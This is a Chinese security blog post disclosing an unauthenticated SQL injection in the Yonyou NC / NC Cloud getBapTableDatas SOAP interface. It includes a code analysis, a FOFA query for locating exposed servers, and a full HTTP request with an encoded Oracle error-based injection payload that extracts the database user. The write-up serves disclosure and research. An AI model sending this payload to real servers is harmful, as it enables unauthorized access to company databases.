---
title: "用友NC及NC Cloud系统 getBapTableDatas SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-ncc-uapws-service-IBapIOService-getBapTableDatas-sqli.html
asset_dir: assets/用友nc及nc-cloud系统-getbaptabledatas-sql注入漏洞
---

# 用友NC及NC Cloud系统 getBapTableDatas SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/5/20 08:19
* 1196浏览
* [0评论](#comment)
* 46分钟阅读

深入探索

sql

SQL

软件


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友") NC [Cloud](#) 是一种商业级的[企业资源规划](#)云平台，为企业提供全面的管理解决方案，包括财务管理、采购管理、销售管理、人力资源管理等功能，基于云原生架构，深度应用新一代数字技术，打造开放、 互联、融合、智能的一体化云平台，支持公有云、混合云、专属云的灵活部署模式。聚焦数字化管理、数字化经营、数字化平台等三大企业数字化转型战略方向，提供涵盖数字营销、智能制造、财务共享、人力共享与协同，智慧采购、数字中台等18大解决方案，助力大型企业全面落地数字化和业务流程优化。用友NC Cloud nc.itf.bap.service.IBapIOService 接口的 `getBapTableDatas` 存在[SQL注入](https://mrxn.net/tag/SQL注入)漏洞，未授权的攻击者可以通过此漏洞获取数据库权限，进一步利用可导致服务器失陷。

云存储

# 影响版本

NC65、NCC1903、NCC1909、NCC2005、NCC2105、NCC2111

# fofa语法

> `app="用友-UFIDA-NC"`

# 漏洞分析

先看 `getBapTableDatas` 业务逻辑的实现

```
public BapTableData[] getBapTableDatas(String ... tableIds) throws Exception {
    PerfWatch pw = new PerfWatch(NCLangRes4VoTransl.getNCLangRes().getStrByID("8001006_0", "08001006-0275") + StringTools.arr2Str((Object[])tableIds, (String)","));
    try {
        if (ArrayUtils.isEmpty((Object[])tableIds)) {
            BapTableData[] bapTableDataArray = new BapTableData[]{};
            return bapTableDataArray;
        }
        ArrayList<BapTableData> dataList = new ArrayList<BapTableData>();
        for (String tableId : tableIds) {
            MetaTableDef tableDef = this.getMetaDef(tableId);
            if (tableDef == null) {
            ......
```

在判断传入的 `tableIds`不为空时，根据传入的多个 `tableId` 分别调用 `getMetaDef` 函数，其实现如下

SQL注入防护

```
private MetaTableDef getMetaDef(String tableId) throws SmartMetaException {
    Object[] splits = tableId.split("@");
    if (ArrayUtils.isEmpty((Object[])splits) || splits.length < 2) {
        String message = NCLangRes4VoTransl.getNCLangRes().getStrByID("8001006_0", "08001006-0273") + tableId;
        throw new RuntimeException(message);
    }
    MetaTableDef tableDef = SmartMetaUtilities.getSmartMetaService().getMetaTableByTableName((String)splits[1], (String)splits[0]);
    if (tableDef == null) {
    ......
```

`tableId` 参数的输入格式应为 `dsName@tableName`，即通过`@`符号将**数据源名称（dsName）**和**表名（tableName）**分隔的字符串。

然后将分割后的数组前两部分分别带入 `getMetaTableByTableName` 函数中，其实现如下

```
public MetaTableDef getMetaTableByTableName(String dsName, String tableName) throws SmartMetaException {
    if (StringUtils.isEmpty((String)tableName)) {
        return null;
    }
    String clause = " upper(tableid)='" + tableName.toUpperCase() + "' ";
    clause = StringUtils.isEmpty((String)dsName) ? clause + "and isnull(dsname,'~')='~' " : clause + "and upper(dsname)='" + dsName.toUpperCase() + "'";
    Object[] datas = new DAOAction().loadByClause(MetaTable.class, SmartConfigCache.getDsName4Design(), clause);
    MetaTable table = null;
```

* tableId[0] 对应 tableName
* tableId[1] 对应 dsName

需要满足 tableName 不为空，否则直接返回null ，其次是 dsName 的处理逻辑

代码安全审计

* 若`dsName`为空：添加条件`isnull(dsname,'~')='~'`，表示查询`dsname`为空的记录。
* 若`dsName`非空：添加条件`upper(dsname)=dsName.upper()`。

`tableName` 和 `dsName` 均是转为换大写后直接拼接进SQL语句中执行，无任何过滤，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

测试报错sql语句如下

```
SELECT guid,dsname,tableid,displayname,displayname2,displayname3,displayname4,displayname5,displayname6,moduleid,authtype,help,creationtime,modifiedtime,creator,modifier,pk_org,pk_group,dirguid,dr,ts,assetLayer,assetIndustry FROM bi_md_table WHERE  upper(tableid)='1' AND (SELECT DBMS_XDB_VERSION.CHECKIN((SELECT BANNER FROM SYS.V_$VERSION WHERE ROWNUM=1)) FROM DUAL) IS NOT NULL --' and upper(dsname)='XXX'
```

也是符合上面的漏洞分析部分

```
POST /uapws/service/nc.itf.bap.service.IBapIOService HTTP/1.1
Host: ncc.mrxn.net
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:gs="http://service.bap.itf.nc/IBapIOService">
    <soapenv:Header/>
    <soapenv:Body>
        <gs:getBapTableDatas>
            <gs:stringarrayItem>&#x44;&#x57;&#x51;&#x75;&#x65;&#x75;&#x65;&#x40;&#x4d;&#x65;&#x73;&#x73;&#x61;&#x67;&#x65;&#x51;&#x75;&#x65;&#x75;&#x65;&#x27;&#x20;&#x41;&#x4e;&#x44;&#x20;&#x31;&#x3d;&#x55;&#x54;&#x4c;&#x5f;&#x49;&#x4e;&#x41;&#x44;&#x44;&#x52;&#x2e;&#x47;&#x45;&#x54;&#x5f;&#x48;&#x4f;&#x53;&#x54;&#x5f;&#x41;&#x44;&#x44;&#x52;&#x45;&#x53;&#x53;&#x28;&#x27;&#x7e;&#x27;&#x7c;&#x7c;&#x28;&#x75;&#x73;&#x65;&#x72;&#x29;&#x7c;&#x7c;&#x27;&#x7e;&#x27;&#x29;&#x2d;&#x2d;&#x20;&#x61;&#x62;&#x63;
</gs:stringarrayItem>
        </gs:getBapTableDatas>
    </soapenv:Body>
</soapenv:Envelope>
```

成功利用报错注入得到数据库用户名

漏洞扫描服务

[![用友NC及NC Cloud系统 getBapTableDatas SQL注入漏洞](images/img-001-2c557908675c.webp)](https://image.mrxn.net/d74780b797664910aac951180dfc576a.webp)

# 参考

* <https://mrxn.net/jswz/yonyou-ncc-uapws-service-IBapIOService-getBapTable-sqli.html>
* `https://security.yonyou.com/#/noticeInfo?id=401`

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [6.参考](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友NC及NC Cloud系统 getBapTableDatas SQL注入漏洞](https://mrxn.net/jswz/yonyou-ncc-uapws-service-IBapIOService-getBapTableDatas-sqli.html)  
文章链接：<https://mrxn.net/jswz/yonyou-ncc-uapws-service-IBapIOService-getBapTableDatas-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

企业资源规划

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-ncc-uapws-service-IBapIOService-getBapTableDatas-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

编程

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAN3ElEQVR4AeyaAXLjSg5D8/797zxrNAKJTbdkO5lJXLXaCgISBClNU0qcX/vfx8fHn1fxp/wvvZGSh6OHV3q0zr3nmXp6wo96qq/GtS9653i6rjy1V1kL+bgNeAq34Xdf6U0heRj4AFLerrMJJUhPOKWeRw+rnjgMjOuqJnT9KI8uVp+guAI8OxrMeXSx+p+BvMJYiIIL73EC00LAm4aZj24VZh/seXrydCSH3QOOz2pAyhv3mSqsNOnBM3VgvFXpgTmPnlnh6GcMngUz955pIb145T9/Av9sIeAnIf8kmPM8XeJ4FK8A7k0NnKevMsw1mPN4MysMHP5+A8+ANdcZmf9V/mcL+eoN/b/3fWshejKePUB5K8BPm/qjKxbANTCnDs7lEcA57CxdSI/iiujgnlo7itOTes+rnvir/K2FfPWiV9/xCUwLyeY7H7fvlUc94CcSzPED+5AWVQ/c+1Kv3Ebc/V4Apk9S8WtGjWsOcw/MefrOWPNW6D3TQnrxy/nV+OUTGAsBbxzOuV8F9k8m4N7u6XmeErBfOTju3p7LK3Qd6NKWA4dvhGbBXoc93gbcAvmEWzi+FAsjKd+AkjkExvXhnO3++BgLSXLx75/Af9r0q8htqy9xGBhPhGoCzHl8YSDhxuoTgDErBZjz6PImDoO9qgnRFQvgenSxdAHua6oH4Lq8QvQeK38V1xuS03wTXi4E/ASAOfcKzsEsHfZYeZ4IxSvA2q8+cA3M0lbIXLAPdk4tDK4lD2ducrAPiPSQgbs3+FETuAfM3f8fsGnAuEBuNgzHejwZAvaCuevdn7r4rKY6eGZ8K5ZP6DVpFXA/q9ZrDLO31noM9sKac1+9L/nyDUnx